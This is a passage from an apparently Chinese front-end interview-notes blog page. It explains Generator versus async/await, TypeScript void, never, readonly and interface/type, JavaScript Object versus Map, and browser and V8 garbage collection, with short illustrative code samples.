<li>Generator 是手动控制迭代器的执行，需要显式调用 <code>.next()</code> 方法来推进执行。这可以用于实现自定义的控制流程，但也需要更多的手动操作。</li>
<li>async&#x2F;await 更像是一种更直观的异步编程方式，它以更类似同步代码的方式编写异步操作。在异步函数内部使用 <code>await</code> 关键字，它会暂停函数的执行，直到等待的异步操作完成，然后继续执行下一行代码。</li>
</ul>
</li>
<li><p><strong>返回值：</strong></p>
<ul>
<li>Generator 函数返回一个迭代器对象，通过迭代器的 <code>.next()</code> 方法可以获取每一步的返回值。</li>
<li>异步函数使用 <code>await</code> 关键字来等待异步操作完成，并且异步函数本身返回一个 Promise 对象，这个 Promise 对象的结果值是异步操作的返回值。</li>
</ul>
</li>
<li><p><strong>错误处理：</strong></p>
<ul>
<li>Generator 需要手动处理错误，可以在 Generator 函数内部使用 <code>try...catch</code> 来捕获错误，或者通过检查迭代器的 <code>done</code> 属性来判断是否发生了错误。</li>
<li>async&#x2F;await 使用 <code>try...catch</code> 来处理异步操作中的错误，更类似于同步代码的错误处理方式。</li>
</ul>
</li>
</ol>
<p>总之，Generator 和 async&#x2F;await 都是处理异步操作的有力工具，选择使用哪种方式取决于项目的需求和开发者的个人偏好。async&#x2F;await 更加直观和方便，适合大多数异步编程场景，而 Generator 则更适合需要自定义控制流程的情况。在实际开发中，你可能会根据具体的需求选择使用其中一种或两者结合使用。</p>
<h3 id="27、Ts中void和undefined区别"><a href="#27、Ts中void和undefined区别" class="headerlink" title="27、Ts中void和undefined区别"></a>27、Ts中void和undefined区别</h3><p>在 TypeScript 中，<code>void</code> 和 <code>undefined</code> 是两种不同的数据类型，它们有着不同的含义和用法。</p>
<ol>
<li><p><strong><code>void</code> 类型：</strong></p>
<ul>
<li><code>void</code> 表示没有返回值的函数的返回类型。通常用于函数声明或函数表达式中，表示该函数不返回任何值。</li>
<li>可以将 <code>void</code> 类型的变量赋值为 <code>undefined</code> 或 <code>null</code>，但不能赋值为其他类型的值。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logMessage</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;This function doesn&#x27;t return anything.&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">let</span> <span class="hljs-attr">result</span>: <span class="hljs-built_in">void</span> = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 合法</span><br>result = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 合法</span><br>result = <span class="hljs-number">42</span>; <span class="hljs-comment">// 错误，不能赋值为其他类型的值</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong><code>undefined</code> 类型：</strong></p>
<ul>
<li><code>undefined</code> 是一个特殊的值，表示变量未初始化或不存在值。它是一个数据类型，同时也是一个全局对象的属性，表示全局的 undefined 值。</li>
<li>在 TypeScript 中，变量可以被显式声明为 <code>undefined</code> 类型，表示变量的值可以为 <code>undefined</code>。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">myVar</span>: <span class="hljs-literal">undefined</span> = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 合法</span><br>myVar = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 合法</span><br>myVar = <span class="hljs-number">42</span>; <span class="hljs-comment">// 错误，不能赋值为其他类型的值</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>总结：</p>
<ul>
<li><code>void</code> 是一种函数返回值的类型，表示函数没有返回值。</li>
<li><code>undefined</code> 是一种特殊的值，表示变量未初始化或不存在值，它也是一个数据类型。</li>
<li>在使用 <code>void</code> 时，通常是为了标识函数的副作用（如输出日志），而不是为了返回值。</li>
<li>在使用 <code>undefined</code> 时，通常是为了表示变量的初始状态或可能的空值。</li>
</ul>
<h3 id="28、Ts中never介绍"><a href="#28、Ts中never介绍" class="headerlink" title="28、Ts中never介绍"></a>28、Ts中never介绍</h3><p>在 TypeScript 中，<code>never</code> 是一个特殊的数据类型，通常表示在任何情况下都不会出现的值。<code>never</code> 类型主要有以下几种常见用法：</p>
<ol>
<li><p><strong>函数返回值类型：</strong></p>
<ul>
<li>当一个函数永远不会返回结果（例如，函数内部抛出异常或者无限循环）时，可以将其返回类型标记为 <code>never</code>。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-comment">// 无限循环，永远不会结束</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>抛出异常：</strong></p>
<ul>
<li>当函数抛出异常时，它的返回类型可以标记为 <code>never</code>。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message);<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>类型保护：</strong></p>
<ul>
<li>在 TypeScript 中，<code>never</code> 类型通常与类型保护结合使用，以确保某些条件下变量的类型永远不会是某个特定类型。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">assertNever</span>(<span class="hljs-params">x: <span class="hljs-built_in">never</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Unexpected object: &quot;</span> + x);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processValue</span>(<span class="hljs-params">value: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>    <span class="hljs-comment">// 处理字符串</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;number&quot;</span>) &#123;<br>    <span class="hljs-comment">// 处理数字</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">assertNever</span>(value); <span class="hljs-comment">// 抛出错误，因为 value 的类型是 never</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>总之，<code>never</code> 类型在 TypeScript 中用于表示不会出现的值或情况，它通常用于函数的返回类型，异常处理以及类型保护。当你标记一个函数返回类型为 <code>never</code> 时，你在告诉 TypeScript 这个函数将永远不会正常返回，从而帮助编译器更好地检查代码。</p>
<h3 id="29、Ts中readonly和const区别"><a href="#29、Ts中readonly和const区别" class="headerlink" title="29、Ts中readonly和const区别"></a>29、Ts中readonly和const区别</h3><p>在 TypeScript 中，<code>readonly</code> 和 <code>const</code> 都用于创建不可修改的值，但它们之间有一些关键区别：</p>
<ol>
<li><p><strong><code>readonly</code> 关键字：</strong></p>
<ul>
<li><code>readonly</code> 是 TypeScript 中的一个关键字，通常用于对象的属性和类的实例属性上。</li>
<li>当一个属性被标记为 <code>readonly</code> 时，它表示这个属性只能在对象创建时或构造函数内赋值，之后不可修改。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Point</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">point</span>: <span class="hljs-title class_">Point</span> = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br>point.<span class="hljs-property">x</span> = <span class="hljs-number">3</span>; <span class="hljs-comment">// 错误，x 属性是只读的</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>readonly</code> 也可以用于类的实例属性，类似于对象属性的行为，只能在构造函数内赋值。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>person.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>; <span class="hljs-comment">// 错误，name 属性是只读的</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong><code>const</code> 关键字：</strong></p>
<ul>
<li><code>const</code> 是 JavaScript 中的关键字，用于创建不可修改的常量。</li>
<li>在 TypeScript 中，<code>const</code> 主要用于创建具有字面量值的变量，例如字符串、数字、布尔值等。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> name = <span class="hljs-string">&quot;Alice&quot;</span>;<br><span class="hljs-keyword">const</span> age = <span class="hljs-number">30</span>;<br><span class="hljs-keyword">const</span> isAdmin = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>const</code> 声明的变量不能被重新赋值。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> x = <span class="hljs-number">10</span>;<br>x = <span class="hljs-number">20</span>; <span class="hljs-comment">// 错误，x 是常量，不可重新赋值</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>const</code> 通常不直接用于对象属性，因为对象属性本身是引用类型，<code>const</code> 只保证引用不变，而不保证对象属性的值不变。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;<br>person.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>; <span class="hljs-comment">// 合法，修改了属性值，但没有修改引用</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>总结：</p>
<ul>
<li><code>readonly</code> 主要用于对象属性和类的实例属性，表示属性只读。</li>
<li><code>const</code> 主要用于创建不可修改的常量值，通常用于基本数据类型的变量。</li>
<li><code>readonly</code> 和 <code>const</code> 都有它们各自的用途，取决于你要创建的内容是不可修改的属性还是不可修改的常量值。</li>
</ul>
<h3 id="30、JS里面Obejct和Map有什么区别"><a href="#30、JS里面Obejct和Map有什么区别" class="headerlink" title="30、JS里面Obejct和Map有什么区别"></a>30、JS里面Obejct和Map有什么区别</h3><p>在 JavaScript 中，<code>Object</code> 和 <code>Map</code> 都是用于存储和操作数据的数据结构，但它们有一些重要的区别：</p>
<ol>
<li><p><strong>键的类型：</strong></p>
<ul>
<li><strong>Object：</strong> 在 <code>Object</code> 中，键必须是字符串或符号（Symbol）。如果尝试使用其他类型的键，它们会被自动转换为字符串。</li>
<li><strong>Map：</strong> 在 <code>Map</code> 中，键可以是任意数据类型，包括基本数据类型（如字符串、数字、布尔值）以及对象、函数等。</li>
</ul>
</li>
<li><p><strong>键的顺序：</strong></p>
<ul>
<li><strong>Object：</strong> 在 <code>Object</code> 中，键的顺序不是固定的，取决于 JavaScript 引擎的实现。通常情况下，键的顺序会遵循插入的顺序，但不是严格有序的。</li>
<li><strong>Map：</strong> 在 <code>Map</code> 中，键的顺序是严格有序的，即它们会按照插入的顺序保持不变。</li>
</ul>
</li>
<li><p><strong>键的个数：</strong></p>
<ul>
<li><strong>Object：</strong> 通过 <code>Object.keys(obj)</code>、<code>Object.values(obj)</code> 或 <code>Object.entries(obj)</code> 等方法可以获取对象 <code>obj</code> 中的键值对，但没有直接的方法获取键的个数。</li>
<li><strong>Map：</strong> <code>Map</code> 有 <code>size</code> 属性，可以直接获取键值对的个数。</li>
</ul>
</li>
<li><p><strong>迭代方式：</strong></p>
<ul>
<li><strong>Object：</strong> 要迭代对象的属性，通常需要使用 <code>for...in</code> 循环或 <code>Object.keys(obj).forEach(...)</code> 等方式。</li>
<li><strong>Map：</strong> <code>Map</code> 有内置的迭代器方法，如 <code>forEach</code>、<code>entries</code>、<code>keys</code> 和 <code>values</code> 等，用于方便地迭代键值对。</li>
</ul>
</li>
<li><p><strong>内存消耗：</strong></p>
<ul>
<li><strong>Object：</strong> 由于对象属性的内部实现可能导致一些额外的内存消耗，因此对于存储大量数据时，<code>Object</code> 可能会占用更多内存。</li>
<li><strong>Map：</strong> <code>Map</code> 的内存消耗通常较小，因为它是为了存储键值对而设计的。</li>
</ul>
</li>
</ol>
<p>通常情况下，如果需要存储简单的键值对数据并且不关心键的顺序，<code>Object</code> 是一个合适的选择。但如果需要保持键的顺序或键的类型不受限制，或者需要更丰富的迭代和操作功能，<code>Map</code> 可能更适合。选择使用哪种数据结构取决于具体的需求。</p>
<h3 id="31、"><a href="#31、" class="headerlink" title="31、"></a>31、</h3><h3 id="32、内存泄漏和浏览器垃圾回收机制"><a href="#32、内存泄漏和浏览器垃圾回收机制" class="headerlink" title="32、内存泄漏和浏览器垃圾回收机制"></a>32、内存泄漏和浏览器垃圾回收机制</h3><p>内存泄漏是指在应用程序中，不再需要使用的内存没有被正确释放或回收，导致内存占用不断增加，最终可能导致程序运行变慢、崩溃或消耗过多系统资源。浏览器垃圾回收机制是一种自动管理内存的系统，用于检测和回收不再使用的内存，以防止内存泄漏。</p>
<p>以下是关于内存泄漏和浏览器垃圾回收机制的重要信息：</p>
<p><strong>内存泄漏的常见原因：</strong></p>
<ol>
<li><p><strong>未释放引用：</strong> 当一个对象不再需要时，应该将其引用设置为 <code>null</code> 或让其超出作用域，以便垃圾回收器可以识别并回收该对象。</p>
</li>
<li><p><strong>循环引用：</strong> 如果两个或多个对象相互引用，而且这些对象都不再被外部引用，它们将无法被垃圾回收，因为它们仍然被引用着。</p>
</li>
<li><p><strong>定时器和事件监听器：</strong> 忘记清除不再需要的定时器或事件监听器可能导致内存泄漏，因为它们会保持对对象的引用。</p>
</li>
<li><p><strong>大量数据：</strong> 如果应用程序不断创建大量数据，但不及时清理或回收这些数据，将导致内存泄漏。</p>
</li>
</ol>
<p><strong>浏览器垃圾回收机制的工作原理：</strong></p>
<p>浏览器垃圾回收机制的主要任务是识别和回收不再被引用的对象，以释放内存。</p>
<ol>
<li><p><strong>引用计数法：</strong> 这是一种最简单的垃圾回收方法，它通过跟踪对象的引用次数来判断对象是否可回收。当引用计数减少到零时，对象被回收。然而，这种方法无法解决循环引用问题，因此现代浏览器不再采用引用计数法。</p>
</li>
<li><p><strong>标记-清除算法：</strong> 这是一种常见的垃圾回收算法。它从一个或多个根对象（通常是全局对象和当前执行上下文）开始，标记所有从根对象可达的对象，然后清除所有未标记的对象。这种方法可以有效地处理循环引用问题。</p>
</li>
<li><p><strong>分代回收：</strong> 浏览器将对象分为不同的代，通常分为新生代和老生代。新生代包含生命周期短的对象，老生代包含生命周期长的对象。垃圾回收器更频繁地检查新生代，较少检查老生代，以提高性能。</p>
</li>
<li><p><strong>增量回收：</strong> 为了避免在回收时阻塞主线程，浏览器可以采用增量回收策略，将垃圾回收工作分为多个步骤，逐步完成，以减少对用户体验的影响。</p>
</li>
</ol>
<p>开发者可以通过以下方式帮助防止内存泄漏：</p>
<ul>
<li>及时释放不再需要的引用。</li>
<li>避免不必要的全局变量。</li>
<li>使用闭包时小心循环引用。</li>
<li>注意清理定时器和事件监听器。</li>
<li>使用浏览器开发者工具来检查内存使用情况并分析潜在的内存泄漏问题。</li>
</ul>
<p>理解内存泄漏和浏览器垃圾回收机制对于构建高性能、可靠的 Web 应用程序至关重要。</p>
<h5 id="V8引擎的垃圾回收"><a href="#V8引擎的垃圾回收" class="headerlink" title="V8引擎的垃圾回收"></a>V8引擎的垃圾回收</h5><p>主要采用了两种算法来处理垃圾回收：分代收集（Generational Collection）和增量标记（Incremental Marking）。</p>
<ol>
<li>分代收集：V8将内存分为两个代：新生代（Young Generation）和老生代（Old Generation）。新生代中的对象存活时间较短，而老生代中的对象存活时间较长。新生代使用Scavenge算法进行垃圾回收，通常采用Cheney算法，将内存分为两个半区（From Space和To Space），每次垃圾回收时，会将存活的对象复制到To Space中，并清空From Space。当一个对象在新生代中经历了多次垃圾回收仍然存活时，会将其移动到老生代。</li>
<li>增量标记：老生代采用标记-清除（Mark-Sweep）算法进行垃圾回收。这种算法首先会标记所有可达的对象，然后清除所有未被标记的对象。为了避免在标记过程中产生长时间的停顿（Stop-The-World），V8采用了增量标记策略。这种策略将标记过程分为多个阶段，在每个阶段之间，JavaScript程序可以继续执行。这样可以降低垃圾回收对程序性能的影响。</li>
</ol>
<p>V8垃圾回收是对JavaScript垃圾回收策略的具体实现。它采用分代收集和增量标记两种算法，有效降低了垃圾回收对程序性能的影响。</p>
<h5 id="如何优化和减少垃圾回收的影响，从而提高应用性能？"><a href="#如何优化和减少垃圾回收的影响，从而提高应用性能？" class="headerlink" title="如何优化和减少垃圾回收的影响，从而提高应用性能？"></a>如何优化和减少垃圾回收的影响，从而提高应用性能？</h5><p>以下是一些建议和技巧来帮助优化和减少垃圾回收的影响：</p>
<ol>
<li><strong>避免全局变量</strong>：全局变量不会被垃圾回收，除非它们被设置为 <code>null</code>。只有在确实需要时才应该使用它们。</li>
<li><strong>使用对象池</strong>：对于频繁创建和销毁的对象（如在游戏或高性能应用中的实体），使用对象池可以重用对象而不是每次都创建新的对象。这可以避免频繁的垃圾回收。</li>
<li><strong>小心闭包</strong>：闭包可能会导致意外的引用，从而阻止对象被垃圾回收。确保你只在需要时使用闭包，并在不再需要它们时断开引用。</li>
<li><strong>手动释放大对象</strong>：对于大的数据结构或数组，如果你知道它们不再需要，可以手动将它们设置为 <code>null</code>，从而提前提示垃圾回收器。</li>
<li><strong>避免循环引用</strong>：确保对象之间没有循环引用，因为这可能导致它们无法被垃圾回收。</li>
<li><strong>使用弱引用</strong>：在合适的场景下，使用 <code>WeakMap</code> 或 <code>WeakSet</code> 可以让你存储对对象的引用，而不会阻止这些对象被垃圾回收。</li>
<li><strong>优化事件监听器</strong>：确保及时删除不再需要的事件监听器。未删除的事件监听器可能会导致内存泄漏。</li>
<li><strong>减少内存分配</strong>：减少动态创建对象、数组和闭包的频率可以帮助减少需要回收的垃圾量。</li>
<li><strong>使用浏览器开发者工具</strong>：浏览器提供的开发者工具（如 Chrome DevTools）可以帮助你监测和诊断内存使用情况和潜在的泄漏。</li>
<li><strong>考虑使用 WebAssembly</strong>：对于需要高性能和低延迟的应用，使用 WebAssembly 可能会帮助减少 JavaScript 的垃圾回收的影响，因为 WebAssembly 有自己的内存管理模型。</li>
</ol>
<h3 id="33、class关键字实现的原理"><a href="#33、class关键字实现的原理" class="headerlink" title="33、class关键字实现的原理"></a>33、class关键字实现的原理</h3><p><code>class</code> 关键字是 JavaScript ES6 引入的一种用于创建对象的语法糖，它更符合传统的面向对象编程的风格。在 JavaScript 中，对象是通过构造函数和原型链创建的，而 <code>class</code> 关键字使得创建对象更加简洁和易读。</p>
<p><code>class</code> 关键字的实现原理基本上仍然是基于原型继承的，它隐藏了一些底层细节，使得开发者能够更方便地创建和继承类。下面是 <code>class</code> 关键字的主要实现原理：</p>
<ol>
<li><p><strong>创建构造函数</strong>：</p>
<p>当你使用 <code>class</code> 关键字定义一个类时，实际上创建了一个构造函数。这个构造函数的名称与类名相同，它用于初始化对象的属性和方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上述代码中的 <code>Person</code> 类创建了一个构造函数，该构造函数接受一个参数 <code>name</code> 并初始化 <code>name</code> 属性。</p>
</li>
<li><p><strong>原型链继承</strong>：</p>
<p>在 <code>class</code> 关键字中定义的方法（如 <code>sayHello</code>）会被添加到类的原型对象上，从而可以被类的实例继承。实际上，每个类都有一个原型对象，它包含了类的方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>上述代码中，<code>sayHello</code> 方法被添加到 <code>Person</code> 类的原型对象上。</p>
</li>
<li><p><strong>创建实例</strong>：</p>
<p>使用 <code>new</code> 关键字可以创建类的实例，这会调用类的构造函数来初始化实例属性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>继承</strong>：</p>
<p>使用 <code>extends</code> 关键字可以创建类的继承关系，子类会继承父类的属性和方法。在子类的构造函数中，必须首先调用 <code>super()</code> 方法来调用父类的构造函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, studentId</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">studentId</span> = studentId;<br>  &#125;<br><br>  <span class="hljs-title function_">study</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span> is studying.`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上述代码中，<code>Student</code> 类继承了 <code>Person</code> 类，并在构造函数中调用了 <code>super(name)</code> 来初始化父类的属性。</p>
</li>
</ol>
<p>总之，<code>class</code> 关键字是一种更加友好和直观的语法，它隐藏了 JavaScript 中原型继承的细节，使得对象的创建和继承更容易理解和使用。然而，它的底层实现仍然依赖于原型链继承，因此理解原型链的工作方式对于深入了解 <code>class</code> 关键字的原理非常有帮助。</p>
<h3 id="34、interface-type比较"><a href="#34、interface-type比较" class="headerlink" title="34、interface type比较"></a>34、interface type比较</h3><p>在 TypeScript 中，<code>interface</code> 和 <code>type</code> 是用来定义对象的类型或自定义类型的两种主要方式。它们有一些相似之处，但也有一些区别，下面是它们的比较：</p>
<h5 id="1-接口（interface）："><a href="#1-接口（interface）：" class="headerlink" title="1. 接口（interface）："></a>1. 接口（<code>interface</code>）：</h5><ul>
<li><p><strong>使用场景</strong>：</p>
<ul>
<li>接口通常用于描述对象的形状（属性和方法）。</li>
<li>接口可以被类实现，用于定义类的结构。</li>
<li>当你需要定义一个新的自定义类型时，接口是一个常见的选择。</li>
</ul>
</li>
<li><p><strong>声明方式</strong>：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>扩展性</strong>：</p>
<ul>
<li>接口可以使用 <code>extends</code> 关键字来扩展其他接口。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-attr">species</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-类型别名（type）："><a href="#2-类型别名（type）：" class="headerlink" title="2. 类型别名（type）："></a>2. 类型别名（<code>type</code>）：</h5><ul>
<li><p><strong>使用场景</strong>：</p>
<ul>
<li>类型别名通常用于给现有类型取一个别名。</li>
<li>可以用于联合类型、交叉类型等复杂类型的定义。</li>
<li>用于定义函数签名类型。</li>
</ul>
</li>
<li><p><strong>声明方式</strong>：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>扩展性</strong>：</p>
<ul>
<li>类型别名可以使用 <code>&amp;</code> 运算符进行类型交叉（Intersection Types）。</li>
</ul>
